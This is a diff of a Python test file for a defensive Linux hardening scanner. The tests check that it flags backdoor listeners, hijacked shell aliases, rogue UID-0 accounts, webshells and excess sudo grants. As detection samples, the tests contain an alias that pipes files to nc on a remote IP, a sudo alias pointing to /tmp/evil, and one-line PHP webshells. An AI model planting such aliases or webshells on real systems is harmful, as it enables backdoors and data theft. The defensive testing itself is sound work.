@@ -19,6 +19,8 @@ class FakeCtx(sentinel.Context):
     def installed_packages(self): return self.packages
     def suid_files(self): return self.suid
     def processes(self): return self.procs
+    def listeners(self): return [(31337, 4242, 'nc')]
+    def snaps(self): return ['john-the-ripper']
     def password_status(self, user): return self.statuses.get(user, 'P')
     def unit_running(self, unit): return unit in ('avahi-daemon', 'vsftpd', 'ssh', 'nginx')
 
@@ -72,8 +74,11 @@ class SentinelTests(unittest.TestCase):
         self.assertEqual(cats['sudoers'][0].mode, 'auto')
         self.assertEqual([f.mode for f in cats['backdoor-line']], ['auto', 'auto'])
         self.assertEqual(cats['empty-password'][0].action, ('lock-user', 'carol'))
+        self.assertEqual(cats['backdoor-listener'][0].action, ('kill', 4242, 'nc'))
         review_texts = ' '.join(f.text for f in sentinel.scan(self.ctx) if f.mode == 'review')
-        for needle in ('mallory', 'toor', '/stray.bin', 'backdoor', 'update.microsoft.com', 'hack.sh', 'pid 111'):
+        self.assertEqual([(f.mode) for f in cats['cron']], ['auto'])
+        self.assertEqual([f.mode for f in cats['uid0-user']], ['auto'])
+        for needle in ('mallory', '/stray.bin', 'update.microsoft.com', 'hack.sh', 'pid 111'):
             self.assertIn(needle, review_texts)
         for clean in ('notes.txt', 'e2scrub_all', 'pid 222', 'alice'):
             self.assertNotIn(clean, review_texts)
@@ -82,7 +87,7 @@ class SentinelTests(unittest.TestCase):
         cats = self.by_cat(sentinel.scan(self.ctx))
         self.assertEqual([(f.action[1], f.mode) for f in cats['service-off']], [('avahi-daemon', 'auto')])
         self.assertEqual({f.action[1] for f in cats['prohibited-service']}, {'vsftpd', 'nginx'})
-        self.assertTrue(all(f.mode == 'review' for f in cats['prohibited-service']))
+        self.assertEqual({f.action[1]: f.mode for f in cats['prohibited-service']}, {'vsftpd': 'auto', 'nginx': 'review'})
         (self.engine / 'data/readme_parsed.json').write_text(json.dumps({'all_users': [], 'critical_services': ['ssh', 'nginx']}))
         again = self.by_cat(sentinel.scan(FakeCtx(self.engine, self.root)))
         self.assertEqual({f.action[1] for f in again['prohibited-service']}, {'vsftpd'})
@@ -194,3 +199,49 @@ class SentinelTests(unittest.TestCase):
 
 if __name__ == '__main__':
     unittest.main()
+
+
+class AliasTests(unittest.TestCase):
+    def test_benign_aliases_ignored_and_hijacks_flagged(self):
+        self.assertFalse(sentinel.alias_hijacked("alias ls='ls --color=auto'"))
+        self.assertFalse(sentinel.alias_hijacked('alias ll="ls -alF"'))
+        self.assertTrue(sentinel.alias_hijacked('alias sudo="/tmp/evil"'))
+        self.assertTrue(sentinel.alias_hijacked("alias cat='nc 1.2.3.4 9 <'"))
+        self.assertTrue(sentinel.alias_hijacked('alias ls=""'))
+
+
+class ForceRemoveTests(unittest.TestCase):
+    def test_second_uid0_account_is_removed_from_all_files(self):
+        with tempfile.TemporaryDirectory() as d:
+            write(d, '/etc/passwd', 'root:x:0:0::/root:/bin/bash\ntoor:x:0:0::/home/toor:/bin/bash\nbob:x:1000:1000::/home/bob:/bin/bash\n')
+            write(d, '/etc/shadow', 'root:!:1:::::\ntoor:!:1:::::\nbob:!:1:::::\n')
+            write(d, '/etc/group', 'sudo:x:27:bob,toor\nadm:x:4:toor\n')
+            write(d, '/etc/gshadow', 'sudo:!::bob,toor\n')
+            write(d, '/home/toor/x', 'x')
+            ctx = sentinel.Context(d, root=d)
+            ok, _ = sentinel._force_remove_user(ctx, 'toor')
+            self.assertTrue(ok)
+            self.assertNotIn('toor', (Path(d) / 'etc/passwd').read_text())
+            self.assertNotIn('toor', (Path(d) / 'etc/shadow').read_text())
+            self.assertEqual((Path(d) / 'etc/group').read_text(), 'sudo:x:27:bob\nadm:x:4:\n')
+            self.assertFalse((Path(d) / 'home/toor').exists())
+
+
+class WebshellTests(unittest.TestCase):
+    def test_shell_patterns(self):
+        self.assertTrue(sentinel.WEBSHELL_RE.search('<?php system($_GET["c"]); ?>'))
+        self.assertTrue(sentinel.WEBSHELL_RE.search('<?php eval(base64_decode($x)); ?>'))
+        self.assertTrue(sentinel.WEBSHELL_RE.search('<?php @$_POST["a"]($_POST["b"]); ?>'))
+        self.assertFalse(sentinel.WEBSHELL_RE.search('<?php echo htmlspecialchars($_GET["q"]); ?>'))
+
+
+class PrivilegeTests(SentinelTests):
+    def test_root_equivalent_groups_sudo_grants_and_snaps(self):
+        write(self.root, '/etc/group', 'sudo:x:27:alice,bob\ndocker:x:998:alice,carol\n')
+        write(self.root, '/etc/sudoers.d/91-carol', 'carol ALL=(ALL:ALL) ALL\n%ops ALL=(ALL) ALL\nalice ALL=(ALL) ALL\n')
+        cats = self.by_cat(sentinel.scan(self.ctx))
+        self.assertEqual([f.action for f in cats['privileged-group']], [('gpasswd-del', 'carol', 'docker')])  # operator alice kept
+        grants = {f.text.split(': ', 1)[1] for f in cats['sudoers-grant']}
+        self.assertTrue(any('carol ALL' in g for g in grants) and any('%ops' in g for g in grants))
+        self.assertFalse(any('alice ALL' in g for g in grants))
+        self.assertEqual(cats['hacking-snap'][0].action, ('snap-remove', 'john-the-ripper'))
